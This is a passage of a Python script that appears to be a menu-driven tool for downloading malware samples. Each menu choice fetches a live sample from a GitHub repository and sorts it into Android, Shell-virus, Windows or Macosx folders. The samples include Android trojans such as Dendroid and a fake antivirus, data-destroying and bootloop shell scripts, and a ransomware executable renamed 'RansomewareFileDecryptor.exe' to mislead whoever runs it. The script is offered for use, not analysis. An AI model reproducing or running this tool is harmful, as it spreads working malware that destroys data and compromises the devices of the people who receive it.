					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.imagepets.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.imagepets.apk?raw=true' Android/ComImagePets.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}ComImagePets.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '26':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.kitchenn.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.kitchenn.apk?raw=true' Android/ComKitchen.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}ComKitchen.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '27':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.laughtter.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.laughtter.apk?raw=true' Android/ComLaughtter.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}ComLaughter.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '28':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesamor.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.prasesamor.apk?raw=true' Android/Prasesamor.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Prasesamor.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '29':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesfee.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.prasesfee.apk?raw=true' Android/Prasesfee.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Prasesfee.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '30':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.recipesmart.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.recipesmart.apk?raw=true' Android/Recipesmart.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Recipesmart.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '31':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.romaticpos.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.romaticpos.apk?raw=true' Android/Romaticpos.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Romaticpos.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '32':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.statetss.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.statetss.apk?raw=true' Android/Statetss.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Statetss.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '33':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.thinkking.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.thinkking.apk?raw=true' Android/Thinkking.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Thinkking.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '34':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/crd.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'crd.apk?raw=true' Android/Crd.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Crd.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '35':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/dendroid.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'dendroid.apk?raw=true' Android/Dendroid.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Dendroid.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '36':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ds.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'ds.apk?raw=true' Android/Ds.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Ds.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '37':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/facebook.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'facebook.apk?raw=true' Android/Facebook.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Facebook.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '38':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fake_av.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Fake_av.apk?raw=true' Android/Fakeav.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Fakeav.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '39':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ArtStation.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'ArtStation.apk?raw=true' Android/ArtStation.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}ArtStation.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '40':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Adware.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Adware.apk?raw=true' Android/MusicPlayerAdware.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}MusicPlayerAdware.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '41':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Settings.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Settings.apk?raw=true' Android/Settings.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Settings.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			else:
				print('{}[{}Err{}] {}Unknown choice!!!'.format(blue,red,blue,white))
				sleep(2)
				exit()
		@staticmethod
		def shell():
			print('{}[{}01{}] {}DataEater.sh\t\t\t{}[{}02{}] {}Bootloop.sh'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}tip{}] {}Ctrl+c to exit'.format(blue,red,blue,white))
			shells = input('{}[{}choice{}] >>>>> {}'.format(white,blue,white,green))
			if shells in('1','01'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/data-eater.sh?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'data-eater.sh?raw=true' Shell-virus/Data-Eater.sh")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Shell-virus folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Data-Eater.sh{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif shells in('2','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bootloop.sh?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'bootloop.sh?raw=true' Shell-virus/Bootloop.sh")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Shell-virus folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Bootloop.sh{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			else:
				print('{}[{}Err{}] {}Unknown choice!!!'.format(blue,red,blue,white))
				sleep(2)
				exit()
		@staticmethod
		def windows():
			print('{}[{}01{}] {}Ugly.bat\t\t{}[{}05{}] {}kace.bat\t\t{}[{}09{}] {}Ransomware'.format(blue,red,blue,yellow,blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}02{}] {}Sleepy.bat\t\t{}[{}06{}] {}Cmd.bat\t\t{}[{}10{}] {}Rip.bat'.format(blue,red,blue,yellow,blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}03{}] {}Rag-eater.bat\t{}[{}07{}] {}Capslock.vbs'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}04{}] {}Kuis.bat\t\t{}[{}08{}] {}Alay.bat'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}tip{}] {}Ctrl+c to exit'.format(blue,red,blue,white))
			windo = input('{}[{}choice{}] >>>>> {}'.format(white,blue,white,green))
			if windo in('01','1'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ugly.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'ugly.bat?raw=true' Windows/Ugly.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Ugly.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('2','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/sleepy.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'sleepy.bat?raw=true' Windows/Sleepy.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Sleepy.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('3','03'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/reg-eater.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'reg-eater.bat?raw=true' Windows/Reg-eater.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Reg-eater.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('4','04'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/kuis.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'kuis.bat?raw=true' Windows/Kuis.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Kuis.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('5','05'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/koce.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'koce.bat?raw=true' Windows/Koce.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Koce.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('6','06'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/cmd.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'cmd.bat?raw=true' Windows/Cmd.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Cmd.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('7','07'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/capslock.vbs?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'capslock.vbs?raw=true' Windows/Capslock.vbs")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Capslock.vbs{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('8','08'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/alay.vbs?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'alay.vbs?raw=true' Windows/Alay.vbs")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Alay.vbs{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo in('9','09'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ransomeware.exe?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'ransomeware.exe?raw=true' Windows/RansomewareFileDecryptor.exe")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}RansomewareFileDecryptor.exe{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif windo == '10':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/RIP.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'RIP.bat?raw=true' Windows/RIP.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}RIP.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			else:
				print('{}[{}Err{}] {}Unknown choice!!!'.format(blue,red,blue,white))
				sleep(2)
				exit()
		@staticmethod
		def macosx():
			print('{}[{}01{}] {}Trinoids\t\t\t\t{}[{}02{}] {}Nothing'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}tip{}] {}Ctrl+c to exit'.format(blue,red,blue,white))
			macos = input('{}[{}choice{}] >>>>> {}'.format(white,blue,white,green))
			if macos in('1','01'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/trinoids.app?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'trinoids.app?raw=true' Macosx/Trinoids.app")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Macosx folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Trinoids.app{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif macos in('2','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/nothing.app?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'nothing.app?raw=true' Macosx/Nothing.app")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Macosx folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Nothing.app{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			else:
				print('{}[{}Err{}] {}Unknown choice!!!'.format(blue,red,blue,white))
				sleep(2)
				exit()
		@staticmethod
		def pdf():
			print('{}[{}01{}] {}How to hack facebook[ext:rar]\t{}[{}02{}] {}Hack facebook[ext:rar]'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}tip{}] {}Ctrl+c to exit'.format(blue,red,blue,white))
			pd = input('{}[{}choice{}] >>>>> {}'.format(white,blue,white,green))
			if pd in('1','01'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/howtohackfb.rar?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
